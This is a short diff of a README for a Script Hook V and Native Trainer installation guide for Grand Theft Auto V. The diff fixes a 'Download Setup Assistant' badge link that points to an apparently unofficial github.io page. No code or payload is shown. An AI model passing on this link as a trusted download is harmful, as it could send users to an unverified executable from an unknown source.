@@ -1,6 +1,6 @@
 # Script Hook V + Native Trainer — Offline Installation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](gta5-script-hook-vnative-trainer.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://gta5-script-hook-vnative-trainer.github.io/.github)
 
 A friendly, child-proof manual for adding **Script Hook V** and its built-in **Native Trainer** to Grand Theft Auto V without any online accounts.
 
